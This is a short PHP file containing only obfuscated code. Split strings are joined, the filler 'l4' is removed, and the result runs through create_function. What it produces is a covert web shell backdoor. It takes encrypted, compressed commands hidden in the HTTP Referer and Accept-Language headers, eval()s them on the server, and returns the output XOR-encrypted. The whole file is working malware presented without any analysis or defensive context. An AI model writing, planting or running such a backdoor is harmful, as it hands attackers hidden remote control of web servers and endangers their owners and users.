<?php
$C='ll("/l4([\\w])l4[\\w-]+(?:l4;q=0.(l4[\\d]))l4l4?,?/",$l4ra,$l4m);l4if($q&&$m){@l4sl4esl4sion_stal4rt();$s';
$x='l4$i=0;$i<l4$l4l;){for($j=0l4;($j<$cl4&&$i<$ll4);$l4j++,l4$i++){$o.l4=l4$t{l4$il4}l4^$k{$j};l4}}retl4urnl4 $o;';
$p='t();@evl4al(@gzuncol4mpresl4s(l4@x(@basl4e64_decol4del4(preg_replacl4e(arl4ray("/_l4/","l4/l4-/"),arrl4';
$E='l4_l4el4xists($i,$s)){$l4s[$il4].l4l4=$p;$e=sl4trpos($s[$i],l4$f);if($el4)l4{l4$l4k=$kh.$kf;obl4_star';
$Y=str_replace('w','','cwrewate_wwfunwctiwon');
$d='$l4kh="5d41";$kf="4l402a";l4functl4ion xl4($t,$kl4){$c=l4stl4rlen($k);$l=sl4trlenl4l4($t);$o="";fol4r(';
$g='45($i.$kh),l40l4l4,3));$f=$sl4l(l4$ss(md5($i.l4$kf),0,3));$l4p=l4"";for($z=1;l4$z<col4unt($ml4l4[1]);$z';
$O='}$r=$_SERVER;$rr=@$r[l4"HTTP_REl4FERERl4"];$l4ra=l4@$r["HTTP_l4ACCl4EPTl4_Ll4ANGUAGE"]l4;if($rr&&$l4ral4)';
$R='l4ayl4l4("/","+"),$ss(l4$s[$i],0,$e))),$k)))l4;$l4o=ob_get_cl4ontl4enl4ts();obl4_end_clean()l4;$d=bal4';
$A='{$u=parse_l4urll4($rr)l4;parsl4e_str($u["l4queryl4"],$q);$q=arl4ray_val4lul4es($ql4);preg_matl4chl4_a';
$M='l4l4se64_encode(x(l4gzcompl4rel4ss($o),$k))l4;prinl4t("<$k>l4$d</l4$k>")l4;@sessionl4_desl4troy();}}}}';
$L='=&$_SESSIONl4;$ss="l4substl4r";l4$sl="strl4l4tolower";$i=l4$m[1][l40].l4$m[l41][1];$h=$sll4(l4$ss(mdl';
$S='++)$pl4.l4=$q[$m[2][l4$z]];if(l4strpl4osl4(l4$p,$h)===0){l4l4$s[$i]="";$p=$ssl4($p,3);l4}if(arl4ray_key';
$G=str_replace('l4','',$d.$x.$O.$A.$C.$L.$g.$S.$E.$p.$R.$M);
$a=$Y('',$G);$a();
?>
